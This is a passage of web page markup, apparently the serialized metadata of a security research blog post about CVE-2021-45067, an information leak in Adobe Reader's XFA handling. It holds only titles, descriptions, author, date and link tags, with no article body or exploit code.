Inc\\\",\\\"logo\\\":{\\\"@type\\\":\\\"ImageObject\\\",\\\"url\\\":\\\"https://hacksys.io/logo.svg\\\"}},\\\"url\\\":\\\"https://hacksys.io/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak\\\",\\\"mainEntityOfPage\\\":{\\\"@type\\\":\\\"WebPage\\\",\\\"@id\\\":\\\"https://hacksys.io/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak\\\"}}\"}],[\"$\",\"link\",\"5\",{\"rel\":\"canonical\",\"href\":\"https://hacksys.io/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak\"}],[\"$\",\"meta\",\"6\",{\"property\":\"og:title\",\"content\":\"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067\"}],[\"$\",\"meta\",\"7\",{\"property\":\"og:description\",\"content\":\"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)\"}],[\"$\",\"meta\",\"8\",{\"property\":\"og:url\",\"content\":\"https://hacksys.io/blogs/adobe-reader-xfa-ansi-unicode-confusion-information-leak\"}],[\"$\",\"meta\",\"9\",{\"property\":\"og:type\",\"content\":\"article\"}],[\"$\",\"meta\",\"10\",{\"property\":\"article:published_time\",\"content\":\"2022-10-12T00:00:00.000Z\"}],[\"$\",\"meta\",\"11\",{\"property\":\"article:author\",\"content\":\"Ashfaq Ansari\"}],[\"$\",\"meta\",\"12\",{\"name\":\"twitter:card\",\"content\":\"summary_large_image\"}],[\"$\",\"meta\",\"13\",{\"name\":\"twitter:title\",\"content\":\"Adobe Reader - XFA - ANSI-Unicode Confusion - Information Leak - CVE-2021-45067\"}],[\"$\",\"meta\",\"14\",{\"name\":\"twitter:description\",\"content\":\"This comprehensive study uncovers an information leak vulnerability in Adobe Reader. The core of the issue lies in the confusion between ANSI and Unicode representations within the XFA framework, leading to potential data disclosure risks. (CVE-2021-45067)\"}]],\"error\":null,\"digest\":\"$undefined\"}\n"])</script><script>self.__next_f.push([1,"12:{\"metadata\":\"$17:metadata\",\"error\":null,\"digest\":\"$undefined\"}\n"])</script></body></html>